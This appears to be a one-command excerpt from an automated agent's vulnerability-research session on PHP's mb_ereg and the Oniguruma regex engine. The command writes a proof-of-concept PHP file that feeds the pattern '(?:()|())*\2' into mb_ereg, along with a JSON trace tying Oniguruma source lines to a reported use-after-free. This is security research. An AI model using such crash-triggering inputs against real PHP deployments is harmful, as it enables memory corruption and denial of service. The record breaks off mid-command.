Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('poc4.php')
p.write_text('<?php mb_regex_encoding("UTF-8"); var_dump(mb_ereg("(?:()|())*\\2", "")); ?>')
trace=[
 {"step":1,"file":"ext/mbstring/tests/mb_ereg_replace_named_subpatterns.phpt","function":"<global>","line":19,"var":"backreference syntax","code":"// backref 0 works, but 01 is ignored","note":"The mbregex engine supports backreferences and capture-aware patterns, so attacker input can build recursive empty-repeat structures."},
 {"step":2,"file":"oniguruma/src/regint.h","function":"<global>","line":63,"var":"USE_STUBBORN_CHECK_CAPTURES_IN_EMPTY_REPEAT","code":"#define USE_STUBBORN_CHECK_CAPTURES_IN_EMPTY_REPEAT","note":"The Oniguruma build used by php enables special empty-repeat capture checking for quantified patterns with captures/backrefs."},
 {"step":3,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5457,"var":"qn->emptiness","code":"qn->emptiness = quantifiers_memory_node_info(body);","note":"When the repeated body can match empty, the compiler descends into the body tree to classify the repeat's emptiness semantics."},
 {"step":4,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4894,"var":"node","code":"switch (NODE_TYPE(node)) {","note":"This recursive walker follows list/alt/quant/bag nodes created directly from the input regex AST."},
 {"step":5,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4935,"var":"NODE_BODY(node)","code":"if (NODE_IS_RECURSION(node)) { return BODY_MAY_BE_EMPTY_REC; }","note":"Recursive capture nodes are classified as BODY_MAY_BE_EMPTY_REC, which is the exact special case guarded by the vulnerable path."},
 {"step":6,"file":"oniguruma/src/regexec.c","function":"STACK_EMPTY_CHECK_MEM_REC","line":2120,"var":"empty-check stack state","code":"while (1) { k--; STACK_BASE_CHECK(k, \"STACK_EMPTY_CHECK_MEM_REC\"); ... }","note":"The special empty-repeat machinery later walks the stack using the recursion-aware state produced by compilation; corrupted state here matches the reported UAF path."},
 {"step":7,"file":"ext/mbstring/tests/bug72399.phpt","function":"<global>","line":9,"var":"pattern '(?:()|())*\\2'","code":"$var5 = mb_ereg_search_init(\"\",\"2\");","note":"The revised exploit candidate supplies a quantified empty alternation plus backreference to force the special empty-repeat capture path."}
]
Path('candidate_trace.json').write_text(__import__('json').dumps(trace))
PY
cat /workspace/candidate_trace.json && echo '
